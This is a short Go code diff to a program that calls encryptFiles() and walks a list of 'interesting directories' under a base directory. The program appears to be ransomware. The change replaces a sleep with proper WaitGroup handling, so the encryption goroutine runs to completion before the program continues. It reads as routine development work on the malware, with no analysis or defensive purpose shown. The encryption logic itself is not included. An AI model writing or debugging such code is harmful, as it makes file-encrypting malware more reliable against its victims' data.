@@ -38,8 +38,6 @@ func main() {
 
 	encryptFiles()
 
-	time.Sleep(time.Second)
-
 	// Wait for enter to exit
 	var s string
 	fmt.Println("Press enter to quit")
@@ -102,8 +100,10 @@ func encryptFiles() {
 
 	var wg sync.WaitGroup
 
+	wg.Add(1)
 	// Loop over the interesting directories
 	go func() {
+		defer wg.Done()
 		for _, f := range cmd.InterestingDirs {
 			folder := cmd.BaseDir + f
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
